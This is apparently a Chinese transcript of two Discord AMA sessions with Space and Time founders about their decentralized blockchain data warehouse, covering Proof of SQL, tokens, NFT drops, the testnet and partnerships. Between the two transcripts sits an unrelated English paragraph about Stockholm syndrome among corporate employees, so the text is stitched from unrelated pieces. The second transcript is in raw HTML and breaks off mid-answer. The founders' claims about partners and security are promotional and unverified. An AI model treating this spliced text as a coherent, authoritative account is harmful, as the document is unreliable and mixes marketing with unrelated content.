是一个位于区块链旁边的数据仓库，可以存储更多数量级的数据，包括链上和链下数据。所以我们有区块链的关系副本，例如以太坊，我们在数据仓库中有客户的链下数据。我们真正在构建的，我们实际上正在考虑围绕这个稍微改变我们的消息——我喜欢你的意见——实际上是一个数据侧链。它实际上是一个侧链，位于 EVM 旁边，位于 Solana 旁边，位于 Flow 旁边，你给区块链命名，它处理这些区块链的所有链下数据，并将这些链下数据与主要链连接起来。\nSpencer：我们现在正在做的很多事情在技术上对消费者或企业来说是不可用的，所以它有点像这个灰色地带，我们可能不仅要想出自己的方式来描述什么我们正在做，但你知道，谁掌握着这一切的钥匙？我们可以这么说吗？谁知道？\nScott：是的，我们是！我想当我们说“数据侧链”时，人们会扬起眉毛，然后我们会说，“哦，好吧，这是一个数据仓库！”它是！在架构上，我们正在构建数据仓库集群，这些集群部署在世界各地的去中心化网络中，但它们将数据汇总到主要链上。\n强大的社区不仅能为项目带来有趣的想法，还能吸引更大的合作伙伴，那么 Space and Time 计划如何建设其社区？\nSpencer：好问题：大型社区确实为项目带来了更好的想法并吸引了大型合作伙伴。因此，作为一家公司，您必须问自己“社区的用途是什么？”Scott和我，从一开始，我们就一直关注这种将社区附加到产品上的更大的想法，这就是为什么：因为我们希望尽可能多的想法涌入，我们想要很多使用我们产品的人，我们如何通过社区用户迭代来更好地应对这种技术挑战。就我们构建这个社区的方式而言：在后端，Mike和我孜孜不倦地致力于与我们稍后命名的其他大型项目建立联系，也通过我们正在进行的这个 NFT 项目，通过会议等。我们只想让你们参与到 Space and Time 舞台上的各个层面。\nScott：是的，NFT空投，我们将在 Discord 上活跃，在 Twitter 上活跃，我们将与我们的合作伙伴做很多工作，围绕 Chainlink 社区构建，围绕 Framework 和 DCG 的其他社区构建，我们将围绕一些 Twitter 营销、公关做很多工作，最终，其中很多是在 Space and Time 之上构建非常酷的项目。我们正在孵化一些非常酷的东西：一些 AAA 游戏，一些我们自己的游戏，我们正在孵化一些令人惊讶的下一代 DeFi 项目，当人们意识到这一切都是由 Space and Time 运行和驱动时，我认为这将激起人们对该领域的真正兴趣，社区建设艰巨！\nSpencer：是的，我无法强调你们实际上对这一点有多早。在SmartCon之后，我们将发布一些非常惊人的公告，所以我希望到那时我们的社区增长更多，但我不能强调你们实际上是多么的早，我们对你们所有人的到来感到兴奋!\n我知道这个问题可能很烦人，因为你经常被问到，但是你能从代币中看到什么优势吗？\nScott：我认为代币的最大优势是：A）它获得了更大的社区； B）它允许人们更容易地激励去中心化网络。Space and Time 是一个由全球数百个数据仓库集群组成的去中心化网络，这些集群由社区运营，归社区所有，由用户部署，而Space and Time代币作为实用代币，将激励这些集群。否则，我们需要用 USDC，也许是 ETH，也许是 LINK 来激励他们，感觉就像在去中心化网络中使用中心化激励。另外，令牌很棒！这有点像，在 Web3 中的全部意义。为什么要构建如此复杂、如此强大的支持、如此庞大的团队、真正去中心化、真正无需信任的网络，却没有代币？\n现在，我这么说，而且，市场现在也有点变化无常，所以我们不急于发布代币。\n具体有哪些方式可以保证数据不被篡改？\nScott：好问题；我们确保通过共识服务以加密方式保证摄入Space and Time的数据。我们多次冗余地将数据摄取到Space and Time中，并就此达成共识，就像 Chainlink 从多个不同的数据馈送中摄取数据并达成共识，然后再将这些数据馈送的结果写入智能合约或在链上创建数据馈送的链。因此，我们可以通过密码学保证将数据摄取到Space and Time中。然后，我们有存储证明，我们可以用密码学证明数据存在于Space and Time中，最后，我们的大部分工作是 SQL 证明，这是我们团队的一种新颖的、全新的密码证明为数据库、数据仓库而构建，以实际证明查询结果是准确的、未被篡改的、在链上得到加密保证的。 SQL 证明为 SQL 生成密码学证明 SNARK，然后可以将其证明给智能合约，SQL 的 SNARK 可以发送到智能合约，因此，这证明了查询执行，证明了存储，并且证明了数据来自可行的来源。\n此时社区如何才能最好地支持该项目并增加价值？\nSpencer：好问题；我认为首先是传播信息。在产品的这个早期阶段，当你们在 Twitter 上传播信息、在我们的 Discord 和 Telegram 中结交朋友时，这非常有帮助。我们正在努力建立这些社区，我们正在努力提高这些数字并让每个人都了解Space and Time，以便我们能够真正向未来的客户、合作伙伴以及你们社区证明我们自己，因此，这将是增加价值的最佳方式。\n在项目的这一点上，您认为 Space and Time 在 Web3 中的主要用例是什么？ GameFi、DeFi？\nSpencer：我会让 CTO [Scott] 更全面地回答用例问题，但肯定是 GameFi。我们绝对沉迷于 Web3 游戏和一般游戏。 Scott 和我一直都是游戏玩家，我们非常喜欢玩游戏，所以我们希望在 GameFi 中占有一席之地。能够将链下和链上数据连接到游戏是非常重要的。它只会让游戏变得更好，尤其是在区块链世界中，所以我们非常高兴能够解决 GameFi 问题。\nScott：我们现在与一系列 AAA 区块链游戏合作，这些游戏将在今年年底或明年初推出，他们正在构建 Space and Time 作为他们的数据仓库来支持他们的 in-游戏数据并将他们的游戏内数据与他们所有的链上数据结合起来。在 DeFi 方面，我们正在与许多 DeFi 协议合作，进行互换、链上衍生品等链上期权。他们正在使用 Space and Time 来帮助分散他们的整个数据堆栈，这些数据为他们的 DeFi 协议提供支持。\n你好，团队！您已于 2022 年 7 月 28 日成功验证了 1000 万美元的种子轮融资，下一轮融资计划何时进行？\nScott：孩子，我们有好消息要告诉你吗！我们在月底的 Chainlink 会议 SmartCon 上发布了一些公告，我们将宣布一些有趣、令人兴奋的事情。\nSpencer：就像，大新闻，伙计们！我为我们的社区成长感到非常兴奋，我们会吸引很多目光。因此，请围绕 SmartCon 做好准备，欢迎这么多新人加入我们的社区。我们将在 9 月 28 日发布重大公告，所以当社区的新成员开始出现时，请张开双臂欢迎他们！现在社区的所有成员都像核心小组，这是第一个 Discord 直播！你们是 OG——Scott 和我会永远记住你们。\n现在还有其他项目在使用 Space and Time 吗？\nScott：是的！就在一分钟前，我们还在谈论基本上已经在 Space and Time 上运行的 DeFi 和游戏项目，一堆 AAA 游戏和创建选项的平台。我们甚至还没有推出！我们甚至还没有推出我们的 alpha 版。我们计划在今年年底左右推出我们的 alpha，我们已经有许多 DeFi 和游戏项目在我们身上运行，我们已经安排了大约一百个项目，它们希望在第一季度开始在 Space and Time 上运行。\nSpencer：我们在网站 (http://www.spaceandtime.io) 上有一份完整的合作伙伴名单和支持者名单，如果你们现在想更深入地了解谁在支持我们并与我们合作。\nSpace and Time 会首先在 Ethereum 或 Polygon 推出吗？\nScott：实际上，两者都有！我们与 EVM 兼容，因此我们支持任何主要的 EVM 链。所以 Space and Time 支持 Ethereum、Polygon、Avalanche 和 Binance，我们很快就会支持 Solana 和 Flow。\n这个项目会超越 Web3 吗？这在 Web2 数据空间中会有什么样的应用？\nScott：我们正在与一群正在进入 Web3 领域的 Web2 企业交谈。这太令人兴奋了！尽管我很喜欢 DeFi，也很喜欢游戏，但当我看到 Web2 企业进入 Web3 领域时，我真的很兴奋，因为那是巨大的繁荣，这就是我们都在等待的浪潮。我们已经看到了 DeFi summer，我们已经知道游戏浪潮要来了，我们现在正在与这么多 AAA 区块链游戏合作，即将推出的 AAA 游戏，所以我知道2023 年将迎来一波巨大的游戏浪潮，但我还没有看到一波企业浪潮。 Space and Time 的定位是将这些企业真正带入区块链。所以现在我们正在与许多想要使用区块链但拥有大量数据的财富 500 强公司交谈，他们需要Space and Time作为一个无需信任的桥梁，将他们的数据从他们的集中式系统转移到他们的分散式系统中系统。\n总结：\nScott：谢谢大家的加入！我们很快就会再次这样做！回答你所有的问题真是太棒了。\nSpencer：另外，我们要确保为这些活动容纳尽可能多的人，我们将尝试在不同时间进行这些活动，以适应世界各地社区中的每个人。\nScott：我们很快就会再做一次！我们将与您一起回答更多问题，我们会更多地参与其中！\nSpencer：非常感谢你的出现！我们非常感谢你们所有人的加入。很高兴再次这样做！ \n Scott：支持数据侧链！\nMike：我要感谢所有出现的人！如果您能在 Twitter、Telegram 和 LinkedIn 上查看我们，我们将不胜感激，所有链接都在服务器上的链接通道中。我们总是乐于听取您的意见，所以如果您有任何建议、对未来内容的想法或任何类似的事情，您可以随时将其发布在建议频道或直接私信我。如果您有任何疑问，请不要害羞与我联系！我来这里是为了给你任何你正在寻找的信息，并让你参与这个令人惊叹的项目，即Space and Time。正如 Spencer 和 Scott 所说，我们计划制作更多这样的内容。我们希望你们能够真正了解我们在该项目中所做的事情，并有机会不仅与 Scott 和 Spencer 交谈，而且有机会与该项目的其他成员交谈，他们正在从事该项目的各个方面。所以我们计划推出更多内容！所以，再次感谢您，我们很快会再次与您交谈！\nSpencer：我们下期见！\n[会议结束]\nSpace and Time链接：\n网站*:*

For example, an employee may develop a sense of loyalty to their company, even if they are mistreated or undervalued by their employers. They may feel a sense of responsibility for the success of the company, and may be reluctant to speak out against unethical practices or policies.\nThe dynamics of a corporate environment can contribute to the development of the Stockholm Syndrome in employees in several ways.\nFirst, many corporate environments are set up in a way that makes employees feel like they have no control. This can lead to feelings of helplessness and vulnerability, which can trigger the development of Stockholm syndrome.\nSecond, the pressure to conform and fit in within a corporate environment can make employees feel like they have no choice but to go along with the demands and expectations of their superiors.

创意总监</p>\n</li>\n</ul>\n<p>感谢所有出席的社区成员！</p>\n<p><code>[会议开始]</code></p>\n<p><em>介绍</em></p>\n<p>Spencer：我们很高兴你们都在这里，我们的社区在 SmartCon 之后绝对爆炸式增长。我的名字是<em>Spencer Reeves</em>，我是 Space and Time 的创意总监。我很高兴在这里与你们中的许多人互动，欢迎所有新面孔！我将把话筒交给 Nate。</p>\n<p>Nate：谢谢，Spencer，我对这次 AMA 感到非常兴奋，我整个星期都在期待它。正如Spencer 所说，我们对社区感到非常兴奋。我们很高兴你在这里，我们很高兴我们正在共同建设它。我们正在努力做很多令人兴奋的事情，我们希望在我们继续前进的过程中开始让社区参与进来。我想你会从我们这里看到我们在 Discord 上的参与度也越来越高。我叫 Nate Holiday，是 Space and Time 的首席执行官兼联合创始人，我真的很期待在接下来的一个小时里回答问题，并确保您对项目和我们正在构建的内容有尽可能多的访问权限和洞察力作为一家公司以及公司的员工和创始人，在我们继续构建它的过程中，我们希望与您进行非常公开和透明的接触。</p>\n<p><code>AMA</code></p>\n<p><strong>Space and Time项目是如何产生的？有什么故事？主要团队是如何组建的？</strong></p>\n<p>Nate：Space and Time 是一个为 Web3 原生构建的去中心化数据仓库。而Spencer和我，我们在数据仓库方面拥有丰富的经验。如果您考虑数据库和数据仓库，我们都在 Teradata 作为高管工作了很长时间。 Teradata 已经建立了业内领先、最重要的数据仓库之一。它已经存在了 40 年，并且还进行了整个云转型。 Teradata 开始将他们的数据仓库移植到云端，您开始看到其他类型的云提供商围绕 Snowflake 和 Databricks 以及各种类型的云提供商兴起。</p>\n<p>Web2 数据库和数据仓库的问题是，第一，它们非常集中。如果你考虑云服务，你甚至会放大数据库和数据仓库的集中化，因为一切都在转移到少数主要云提供商。其中一部分真的很好：如果你想建立新业务，有很多云服务可以让建立新业务变得非常容易，并且可以尽早开始。但是世界上的中心化数据库也存在很多问题。随着世界走向去中心化，随着世界从不同业务之间的无边界整合转变，我们坚信数据库和数据仓库的去中心化是新的前沿，是下一个前沿。</p>\n<p>我进入 Web3 是通过 Chainlink，作为 Chainlink 的战略顾问，我开始与团队围绕上市、数据战略和战略计划展开合作。对我来说变得非常明显的一件事是，正在构建的去中心化应用程序都是构建在我们帮助创建的 Web2 结构上的：这些集中式数据库，这些大型云服务提供商。少数人控制着多数人的大量数据。如果你正在构建去中心化的应用程序，我们应该有去中心化的数据库和数据仓库来支持它，将隐私带回互联网成员，确保你对你的数据有完全的控制权，同时也确保当你考虑正在构建的应用程序，它们可以被信任和验证。</p>\n<p>你看看当今世界上正在构建的 DeFi 应用程序，我想我们所有人都知道，在一周又一周的新闻中，你继续听到关于黑客的信息，你继续听到人们得到他们不应该得到的信息可以访问，有正在发生的内部工作。因此，这些集中式数据库存在一个已知问题。如果你正在构建一个去中心化的应用程序，你需要确保它是安全的，你需要确保它广泛分布，你需要确保你提供给最终用户、应用程序的实际数据， DeFi 项目，实际用户可以信任它。因此，我们看到了一个巨大的机会，我们可以致力于构建下一代数据库，下一代软件。</p>\n<p>如果你只是从数据库转换的角度考虑，你可以把它放在一张非常简单的幻灯片中，说二十年前它是内部部署数据库和数据仓库，你有世界上的 Oracles 和世界上的 Teradatas。现在你有，目前正在建设中，云数据库，你有各种类型的云服务器和数据库，为当今世界提供动力。而在未来，我们正在建设未来，下一代数据库技术和数据仓库，它是去中心化的。因此，我们真的很高兴能为这一旅程提供动力并进行建设。</p>\n<p><strong>对于技术水平不高的人，您能否用更简单的术语解释Space and Time？</strong></p>\n<p>Nate：是的，这是一个很好的问题，我们一直都在问这个问题。对于世界上的大多数人来说，甚至数据仓库的概念也是一个复杂的概念。我的想法是数据仓库允许将表大规模连接在一起以进行分析和建模并为业务流程提供动力。所以简单来说，数据库和数据仓库，我用不同的术语来使用它们，因为它们在行业中做不同的事情。但总的来说，对于不了解数据库和数据仓库的人来说，如果你去 ebay.com 或者你去你最喜欢的购物网站，他们会运行不同类型的推荐引擎来确定你可能喜欢什么，什么你可能喜欢看，你可能喜欢买什么。这些推荐引擎使用关于你和你这样的人的数据以及相似的模型来根据你在网络中的交互方式来确定他们应该向你展示什么。</p>\n<p>数据仓库还用于为企业提供动力，仅从账簿结账的角度来看，如果你今天想去经营一家企业，假设你是一家上市公司，你希望能够每周、每个月、肯定每个月都结账如果你是公开交易的，但即使是每一天，也需要数据库和数据仓库的力量才能确定当天、那一周、那个月、那个季度的成本和收入，以便能够确定您的业务所在的位置。显然，您对收入和成本的洞察力越多，您在建立业务时就越容易做出改变，以确保在结束一个月、结束一个季度时，您对结果有更多的控制权，这将给市场和投资者带来更大的信心。</p>\n<p>因此，这些只是我们考虑用例时的两个示例，我喜欢的另一个是游戏。如果您曾经下载过游戏并经历了这个入职流程，这个流程简单吗？那个过程很难吗？在这个过程中，有人会因为你要求的信息过于机密、他们不想给你，或者你有太多的步骤要经过而退出吗？例如，帮助一家游戏公司确定您何时吸引客户，这是什么样的？拥有该应用程序的数据能力是一个非常好的用例，以确保您可以与客户互动并以减少该游戏中入职摩擦的方式入职。然后也只是玩电子游戏。如果你想一想谁在你的社交网络中，你是如何与他们互动的，所有这些都是通过后端的数据库和数据仓库运行的，以通过技术设备和通过互联网。因此，我们正在为此提供动力，以便在您通过各种技术相互交流时减少世界上的摩擦。</p>\n<p><strong>我们听到很多关于 SQL Proof of SQL 的信息，你能详细解释一下它，它在《Space and Time》中扮演什么角色，以及为什么它如此新颖吗？</strong></p>\n<p>Nate：当然，SQL 证明是有远见的，它将改变市场，我们非常看好 SQL 证明。这就是为什么。如果您考虑一下我刚才谈到的所有业务流程，这些流程今天都在集中式数据库上运行，并由集中式数据仓库提供支持。今天，全世界都相信拥有服务器的人、拥有软件和数据库的人以及在这些服务器、软件和数据库上运行的实际公司不会造成伤害。我们只是相信这是一个公平和诚实的系统，而实际上，公司每天都在优化他们参与的方式，以有利于他们的用户参与，增加收入，降低成本。这很公平；他们有能力在一段时间内使用数据改善业务。</p>\n<p>但是，如果您考虑去中心化应用程序，现在您突然需要确保您可以信任您的资金流向。您知道，您与该应用程序交互的方式是否公平？如果你正在玩电子游戏，如果你正在使用 DeFi 协议，那么这些牌是否对你不利？因此，我们正在构建的真正令人兴奋的是，在未来一年、两年、三年、四年、五年、十年、二十年内，每个人都认为今天公平的集中式流程将转向智能合约，令人兴奋的部分是这些智能合约将会自动化，这样就没有人的参与和互动。令人兴奋的是，通过 SQL Proof of SQL，我们可以使向智能合约交付的数据可验证和防篡改，以便您作为用户可以信任它。所以你可以说，在运行时，是否有任何东西篡改了数据？有没有添加数据？是否删除了任何数据？他们是否改变了以前运行查询的方式，这样输出可能会有所不同，或者卡片的堆叠方式会有所不同？</p>\n<p>因此，围绕 Proof of SQL 的令人兴奋的部分是，智能合约现在可以查询整个数据仓库，而且从该数据仓库查询的内容比今天可以查询的内容大很多倍。所以这意味着防篡改分析的用例增长，对吧？因为对于您可以在数据仓库中执行的任何操作，现在您可以将防篡改、可验证、无需信任的结果交付给智能合约。所以现在您可以开始采用该业务逻辑或自动化，并且可以将其转移到可以信任的智能合约中。</p>\n<p>令人兴奋的是，它改变了权力动态。它说，如果你想参与 Web3 应用程序的新世界，你应该使用 SQL 证明，因为它向智能合约证明你所做的事情是公平和诚实的。而且它也向智能合约证明某些东西没有被篡改过。如果您考虑一下，用户会喜欢它，因为它是透明的，它是防篡改的。企业喜欢它还因为，想想看，它是公平和透明的。如果我今天是一个 DeFi 协议的首席执行官，该协议在链上为数亿美元或数十亿美元提供支持，并且我在集中式数据库中运行所有这些协议，我晚上将无法入睡。因为作为一家公司的首席执行官，我也希望有信心，如果我为数亿美元提供动力，我不会在第二天醒来时看到内部黑客或外部黑客，结果现在我必须决定如何最好地满足我们客户的需求，因为一亿美元被盗了。</p>\n<p>因此，在我们前进的过程中，双方都会喜欢能够为智能合约提供支持的防篡改分析的能力。</p>\n<p><strong>您是在构建一个仅用于其他 Web3 项目的产品，还是用于替换现有的 Web2 数据存储和处理解决方案？如果是后者，什么会吸引大公司在他们今天使用的解决方案上转向 Space and Time？</strong></p>\n<p>Nate：另一个很好的问题，Web3 的应用程序世界非常庞大，并且正在以非常快的速度增长。 Space and Time 是一个原生的 Web3 去中心化数据仓库，它将推动行业向前发展。我们正在为此建造它。因此，我们认为要吸引我们的 alpha 客户、beta 客户并最终通过生产发布，我们的重点是我们正在构建应用程序时赋予 Web3 世界权力。话虽这么说，在接下来的几年里，你将开始看到 Web3 和 Web2 的界限融合在一起。已经有 Web2 公司，顺便说一下，非常大的公司，他们打电话给我们说，“嘿，我们知道我们需要开始与区块链数据交互，但我们不确定如何去做，因为我们拥有所有这些集中的 Web2 数据库。我们拥有所有这些数据库和数据仓库专家的工程师，我们对他们都进行了 SQL 培训，但我们真的不知道如何考虑从不同的区块链中获取所有这些区块链数据 ”</p>\n<p>因为他们看到了一个正在生成区块链数据的世界，并且将会有多个区块链，他们将不得不与之交互。他们正在看着它，说：“我们将把所有这些数据从链下转移到我们的企业数据架构中，但我们不确定它适合哪里 ” 他们喜欢关于 Space and Time 的令人兴奋的部分是，他们将其视为入口，我们为数据编制索引，我们将其放入关系数据存储中，我们使其可供他们使用，它在数据仓库结构中他们知道并理解，现在它正在驱动 SQL 语言。因此，现在他们可以开始将他们的 ERP 系统、云端或本地的遗留数据仓库桥接在一起，并且他们可以开始在单一环境中将他们的数据架构桥接在一起。</p>\n<p>如果你想一想，从企业到企业的结构和 Web2 中真正强大的另一件事是这个概念，例如，假设Mike，Spencer和我都去听音乐会，我们坐在那里，我们喜欢这场音乐会，我们玩得很开心。如果您考虑为该音乐会提供支持的企业，那么有数十或数百家企业为该音乐会提供支持。有停车场，有食物，有衬衫，还有售票。坐在那里的所有这些人都在为我们提供服务，但实际上我们只是买票，食物被送到我们的座位上，或者我们去拿食物，然后我们就参加了这场音乐会。嗯，那场演唱会的后台系统今天很复杂。那场音乐会的结算在今天非常复杂。他们必须了解该用户做了什么、他们买了什么以及他们如何参加音乐会，他们必须决定如何将所有收入分配给参与的所有不同企业。</p>\n<p>而今天，这个过程需要数周或数月才能确定如何将其全部拆分。你想一想是什么推动了下一代消费者如何与一家企业互动，而这反过来又需要向许多不同的企业付款，Space and Time 正在构建的区块链用例和数据仓库用例正好位于其中。这非常强大，因为大多数企业都以这种方式运营，所以现在你开始整体地桥接 Web2 和 Web3。</p>\n<p><strong>封闭的 alpha 即将到来，人们如何参与？</strong></p>\n<p>Nate：我们的目标是在年底推出我们的封闭式 alpha。我们确实希望参与我们封闭的 alpha 测试。如果您有兴趣参与并且有一个需要数据的项目并且您希望能够与该数据进行交互，请联系 Mike、联系 Spencer、联系我们的团队。它关闭是因为我们想确保我们在 Web3 中测试的 DeFi 和游戏中有正确的用例，我们想确保您拥有正确的资源和支持，我们想确保您从 alpha 角度来看，拥有您需要的一切。但它有点侧重于业务用例。因此，如果您正在从事一个项目，并且想尝试一下我们正在启动的 alpha 项目，请联系我们，我们很乐意与您合作。</p>\n<p><strong>让我们换个话题，Spence，我们最近发布了我们的第一个Space and Time NFT，关于未来的版本，您能告诉我们什么？</strong></p>\n<p>Spencer：首先，我只想对大家表示感谢，感谢大家对我们从第一次 Space and Time NFT drop 中得到的惊人回应，我知道这有点像游击营销策略，我们只是突​​然发布了它。这首先是我们的想法，我们只是想让它变得公平，让每个人都有平等的机会获得一个。 Omar Aqil 是艺术家，我看到你们中的一些人在 Twitter 上给予他爱，我非常感谢。他实际上向我伸出了手，并且对你们给予他的支持以及他收到的所有赞美感到不知所措，所以我只想表达他对社区的感谢。</p>\n<p>就Space and Time 社区NFT的未来计划而言，我们总共收集了五个。我们已经发布了一个，我们还计划在未公开的未来日期再发布四个，我们现在正在调整智能合约的一些功能。一旦我们完成这些，我们就会为你们向社区推出更多 NFT。我们很高兴你们所有人这么早就来了，这就是我们发起这种倡议的目的，真正奖励你们来到这里，在我们的社区中如此活跃。每个在 Twitter 上大喊大叫的人，都不会被忽视！我们审视了所有这些，我们非常感谢绝对的支持，我们很高兴在未来发布更多。就为这些社区 NFT 添加一些实用性而言，目前它们没有实用性。就像我们说的，它们只是供你们佩戴，作为作为该项目早期支持者的荣誉徽章，但我们绝对期待未来也能为 NFT 添加一些Space and Time实用程序。</p>\n<p><strong>测试网的计划是什么？任何人都可以参加吗？是否有任何激励参与的计划？</strong></p>\n<p>Nate：我们计划明年 5 月推出测试网，它将是开放的。关于我们正在构建的令人兴奋的事情是，我们正在创建Space and Time以从主要区块链中获得干净的索引数据，这意味着如果您在测试网期间访问我们的网站并运行查询，您实际上将拥有区块链数据在主要链条上编入索引，准备就绪。所以即使你没有经营企业，即使你没有坐在那里说，“嘿，我没有要连接的 ERP 系统，我不是在制作视频游戏，所以我无法连接Unreal Engine 5，我不需要在大规模环境中合并我的链上和链下数据，”你仍然可以转到 Space and Time 并开始查看区块链数据并运行分析以独立获得更多洞察力将链下数据汇集在一起​​。这是一件非常强大的事情，因为现在你可以开始研究，例如，你遇到的简单问题，比如跨链某些代币的主要持有者，或者查看跨链流动资金池的能力。因此，您可以开始做一些非常强大的事情，因为来自主要链的区块链数据将被编入索引，以便您开始运行查询。</p>\n<p>这将是开放的，您可以开始尝试并参与测试网和测试版。因此，我们看到的令人兴奋的事情是我们希望让您随时可以使用这些数据。我们想让它易于使用。因此，我们将为您存储区块链数据。这不像您必须创建一个新实例来存储数据并为存储的数据付费。我们希望为您提供随时可用的索引数据。因此，当您登录到 Space and Time 并希望仅对区块链数据运行查询时，即使您没有链下数据，它也很容易为您提供，您可以继续运行该数据并运行那些分析，您不必弄清楚如何为数据索引付费。它应该就在那里，随时可以使用。所以我们非常兴奋，我们绝对欢迎大家加入我们在 5 月份推出的测试版本和beta版本。</p>\n<p><strong>当 Space and Time 进入主网时，是否任何人都可以操作节点，还是仅限于具有特殊权限的人？</strong></p>\n<p>Nate：我们希望尽可能多的人对运行节点感兴趣。如果您考虑一下，数据仓库就是节点集群。因此，当我们进入市场并构建节点运营商时，不同之处在于，如果您运行大规模分析，我们将在节点集群上运行它们。所以从集群的角度来看是三个或更多。所以这有点不同于“我有一台笔记本电脑在这里，它没有被使用，我只是想启动它”，但我们确实希望有尽可能多的人参与，也希望有尽可能多的企业参与节点操作可能的。我们正在与一些大型服务器和计算提供商合作，以考虑不同的选择，以及我们如何让可能无法访问服务器或节点集群的人也能参与节点操作。</p>\n<p>所以我们仍处于计划的早期阶段，但我坚信，如果你想参与公用事业，即使你没有大仓库或一堆服务器，你作为人们应该能够参与该生态系统和经济。如果您考虑出租房屋、AirBnB，例如，如果您考虑风骡或石油钻井平台，从某种意义上说，您希望能够参与可能拥有一部分石油钻井平台或实际资产的经济活动石油钻井平台，无需知道如何操作石油钻井平台，无需去钻实际的石油并将石油取出并出售给商品市场。所以我们以同样的方式考虑，因为显然操作服务器集群很复杂，所以我们正在考虑如何确保人们可以作为节点运营商或部分节点运营商参与 Space and Time，所以这是我们正在努力的事情。</p>\n<p><strong>该项目未来的资金计划是什么？当前的资金跑道是否延伸到主网，或者是否会有未来的融资轮次？</strong></p>\n<p>Nate：我们非常荣幸并感谢投资者群体对我们的资助和支持。目前没有计划在我们的测试网之前筹集更多资金。当我们考虑进入主网时，我们有足够的资金来启动进入主网。因此，在我们准备主网上线时，我们会关注市场，以确定什么是最适合企业运营的。但值得庆幸的是，我们已经成功地得到了投资界的支持，对许多人来说，这是一个非常艰难的市场。我们已经能够发展我们的投资社区，并得到他们的支持。所以我们对此表示感谢。但简单的答案是，我们有足够的资金通过主网运行。我们没有计划在今年筹集更多的资金。我们主网上线的目标是在秋天，9月/10月。我们将看看市场情况，我们将看看我们想从主网上线和主网启动的角度实现什么，并确定什么是对公司最好的，但目前还没有计划。</p>\n<p><strong>在上一届 AMA 会议上，有人问到 EVM 兼容网络的问题，Scott 回答说除了以太坊之外，还有支持 Solana 和 Flow 的计划。未来是否还有计划与 Aptos 和 Near 一起推出 SxT？</strong></p>\n<p>Nate：好问题；当您考虑在明年秋天全面投入主网时，我们看到这样一个世界，人们在其中运行应用程序和业务的主要区块链应该可以免费使用，并使用 Space and Time 中的关键数据存储索引。因此，这不是“如果”的问题，而是“何时”的问题。我们谈到了 Solana，我想你看的是 Mysten Labs 和 Sui，对吧？团队目前正在与他们合作为该数据编制索引。所以你看看 Near，你看看 Aptos，你看看 Flow。对我来说，这不是我们是否要这样做的问题，这只是通过数据索引工作并确保其可用最有意义的时间和优先级。但我们绝对希望将主要生态链编入索引，随时可供您作为商品运行查询，作为一种随时可以免费使用的东西。</p>\n<p><strong>Space and Time 参与了 Kwil 最近的一轮融资，看起来 Kwil 将成为 Space and Time 的直接竞争对手，Space and Time 投资该项目的原因是什么？</strong></p>\n<p>Nate：我们非常喜欢 Kwil 的团队，行业需要 Kwil 团队正在建设的东西。我只想先退后一步，考虑将行业数据用于 SQL 所需的不同用例。需要许多不同的用例来支持各种类型的业务和各种类型的分析。如果您考虑 Web2 中的 SQL 解决方案，它们非常庞大且各不相同。运行 Snowflake 数据仓库与 MySQL 有不同的原因。在数据库和数据仓库中操作的原因各不相同，我们不认为这是一个赢家通吃的市场。如果你考虑 Web3，我认为会有很多不同的很棒的、成功的项目，我们相信 Kwil 会成为其中之一。</p>\n<p>因此，当您考虑如何运行各种类型的分析以及这些分析的不同用例时，例如，您会对各种类型的简单 SQL 查询有不同的解决方案。它与 SQL 证明、大规模企业分析、所有主要链的索引有很大不同。所以我们看好 Kwil 的建筑，绝对，他们很棒。我们喜欢这个团队，我们认为在不同类型的用例中使用市场上各种类型的数据库有很多不同的原因。所以我们绝对不相信这是一个赢家通吃的市场，我们对他们在 Kwil 的建设感到兴奋。从某种意义上说，问题是如果您正在构建一个项目，为什么不对所有内容都使用Space and Time呢？虽然你可以，但在某些用例中它可能更有意义，例如，如果你在 Arweave 上，并且你需要运行快速分析，那么启动 Kwil 并在其中运行一些 SQL 分析可能更有意义Arweave 社区。因此，我们对他们正在构建的产品感到兴奋，我们相信许多人都有参与并赢得 SQL 市场的空间。 </p>\n<p><strong>Space and Time相比Web2存储商在数据存储安全方面有什么优势？ Space and Time 如何保护用户数据？</strong></p>\n<p>Nate：我不想太技术化，但是，如果您考虑去中心化网络，就会发现数据安全与中心化网络相比具有特定的优势。如果你将所有数据都放在一个中央数据库中，显然，从数据安全的角度来看，它会变得更容易被黑客攻击，更容易从整体上获取信息并从这个角度成为坏人。虽然 Space and Time 是一个开源项目并且我们希望它是这样，并且我们鼓励每个人共享数据并围绕数据相互交互，但我们也有端到端加密，这意味着如果您选择当您参与 Space and Time 时，您可以确定数据是否需要在静态和查询过程中加密。所以这提供了一个非常强大的数据安全能力，因为它总是被加密的。如果您选择加密——顺便说一下，它是可定制的——您可以确定要加密哪些表，然后该表在静态和动态中加密。我们还有一些非常独特的技术和合作伙伴关系，我们也正在使用这些技术和合作伙伴专门针对数据加密。</p>\n<p>然后，很明显，我认为通用的 Web3 响应考虑了我们拥有的各种类型的已知运营商以及围绕节点运营商的激励措施；确保节点运营商的数据和安全性以积极的方式参与是有价值的。我要指出的最后一部分是 SQL 证明。因此，Space and Time 的独特之处在于它具有数据的存储证明和 SQL 证明。因此，如果您在 Space and Time 中运行数据，如果您使用 SQL 证明来确保数据不被篡改，那么您将获得额外的安全级别。当数据进入时，您拥有额外级别的安全性以确保数据不被篡改并且存在存储证明。</p>\n<p>Scott 和团队正在构建的索引平台令人兴奋的事情之一是，他们也在推动对进入Space and Time 的实际索引数据的防篡改洞察。因此，在许多不同的领域中，索引数据的防篡改具有一定程度的安全性：SQL 证明、数据加密、网络去中心化以及围绕参与者激励的节点操作。因此，从数据安全的角度来看，有许多不同的领域存在制衡，所有这些都是在这方面对 Web2 的改进。</p>\n<p><strong>Chainlink 是传统市场和加密世界领先的预言机提供商，Space and Time 与 Chainlink 合作，以提高链上和链下数据库的及时性和准确性。您能告诉我们更多有关 Space and Time 如何使用 Chainlink 网络的信息吗？</strong></p>\n<p>Nate：Chainlink 是一个了不起的合作伙伴。他们是我们从第一天开始就与他们一起构建的人，我们甚至在考虑构建去中心化数据仓库和构建这个数据生态系统的结构时就构建了前一天。我想说的第一件事是，我们对 Web3 如此兴奋和看好的原因之一是能够在 Web3 的新数据标准上进行协作。成为 Chainlink BUILD 计划的一部分对我们来说真的很令人兴奋，因为我们可以与他们正在构建的先驱一起参与 Web3 的真正前瞻性数据开放标准构建。我们不必去构建预言机结构，因为 Chainlink 是预言机去中心化的领导者。</p>\n<p>因此，令我们兴奋的是，我们可以参与并专注于数据库，专注于数据仓库，以与 Chainlink 正在构建的生态系统进行交互。因此，我们开始参与并扩展我们的数据用例，而不必在其他人比我们能力强得多的领域自己构建所有内容。但我会给你举个例子。因此，当您考虑我们将如何使用 Chainlink 